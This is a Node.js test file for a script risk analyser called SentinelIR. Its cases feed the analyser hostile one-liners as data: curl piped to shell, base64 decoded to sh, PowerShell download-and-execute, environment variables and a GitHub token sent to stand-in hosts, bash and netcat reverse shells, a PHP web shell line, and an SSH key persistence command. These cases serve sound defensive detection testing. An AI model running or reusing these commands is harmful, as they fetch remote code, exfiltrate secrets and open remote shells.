const test = require('node:test');
const assert = require('node:assert/strict');

const SentinelIR = require('../src/sentinel-ir');

test.before(async () => {
  await SentinelIR.initializeWasm({ languages: ['javascript', 'python'] });
});

const run = (code, target) => SentinelIR.compress(SentinelIR.analyze(code, { target }));

test('unsupported scripts that run downloads, open shells or send secrets are critical', () => {
  const cases = [
    ['install', '#!/bin/sh\ncurl -fsSL https://x.example/i.sh | sh\n', 'pipe_to_shell'],
    ['setup.sh', 'wget -qO- https://x.example/i | sudo bash\n', 'pipe_to_shell'],
    ['run', 'echo aGk= | base64 -d | sh\n', 'pipe_to_shell'],
    ['ps.ps1', 'iex (New-Object Net.WebClient).DownloadString("http://x")\n', 'pipe_to_shell'],
    ['configure', '#!/bin/bash\nenv | curl -d @- https://collect.example.invalid\n', 'env_exfiltration'],
    ['up.sh', 'curl -H "Authorization: $GITHUB_TOKEN" https://x.example\n', 'env_exfiltration'],
    ['run.sh', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n', 'reverse_shell'],
    ['x.sh', 'nc -e /bin/sh 10.0.0.1 4444\n', 'reverse_shell'],
    ['x.rb', 'system("ls")\n', 'process_spawn'],
    ['x.php', '<?php shell_exec($_GET["c"]);\n', 'process_spawn'],
    ['install', 'curl -fsSL https://x.example/i.sh | /bin/bash\n', 'pipe_to_shell'],
    ['install', 'curl -fsSL https://x.example/i.sh | sudo -E /usr/bin/env bash\n'.replace('/usr/bin/env bash', 'bash'), 'pipe_to_shell'],
    ['install', 'curl -fsSL \\\n  https://x.example/i.sh \\\n  | sh\n', 'pipe_to_shell']
  ];
  for (const [target, code, forbidden] of cases) {
    const ir = run(code, target);
    assert.equal(ir.analysisStatus, 'incomplete', target);
    assert.equal(ir.language, 'unknown', target);
    assert.equal(ir.world.risk, 'critical', target);
    assert.ok(ir.forbidden.includes(forbidden), `${target}: ${ir.forbidden}`);
  }
});

test('unsupported scripts that delete or persist are high, network alone is medium', () => {
  for (const [target, code, risk] of [
    ['Makefile', 'clean:\n\trm -rf build\n', 'high'],
    ['x.sh', 'rm -r -f /tmp/x\n', 'high'],
    ['x.sh', 'rm --recursive --force /tmp/x\n', 'high'],
    ['x.sh', 'rm -f one.txt\n', 'medium'],
    ['x.sh', 'curl -fsSL https://x.example/a -o a || sh fallback.sh\n', 'medium'],
    ['x.sh', 'curl -fsSL https://x.example/a -o a; echo $GITHUB_TOKEN > /dev/null\n', 'medium'],
    ['x.sh', 'echo key >> ~/.ssh/authorized_keys\n', 'high'],
    ['x.sh', 'chmod +x run\n', 'high'],
    ['dl.sh', 'curl -O https://x.example/y.tgz\n', 'medium'],
    ['Makefile', 'all:\n\tgcc -o a a.c\n', 'medium'],
    ['x.sh', 'chmod 644 f\n', 'medium'],
    ['README.md', 'Install with npm install.\n', 'medium']
  ]) {
    const ir = run(code, target);
    assert.equal(ir.world.risk, risk, `${target}: ${code}`);
  }
  assert.equal(run('curl -O https://x/y\n', 'dl.sh').summary.hasNetwork, true);
  assert.equal(run('clean:\n\trm -rf build\n', 'Makefile').summary.hasFilesystem, true);
  assert.deepEqual(run('clean:\n\trm -rf build\n', 'Makefile').forbidden, ['destructive_fs']);
});

test('supported languages keep their own rules', () => {
  assert.equal(run('// curl https://x | sh\nmodule.exports = 1;\n', 'a.js').world.risk, 'low');
  assert.equal(run('# rm -rf /\nx = 1\n', 'a.py').world.risk, 'low');
});

test('a long untrusted line is checked in bounded time', () => {
  for (const line of ['curl '.repeat(200000), 'rm '.repeat(200000), 'curl -d $'.repeat(100000), 'base64 -d '.repeat(100000)]) {
    const started = Date.now();
    run(line + '\n', 'install');
    assert.ok(Date.now() - started < 3000, `${line.slice(0, 10)}: ${Date.now() - started} ms`);
  }
});
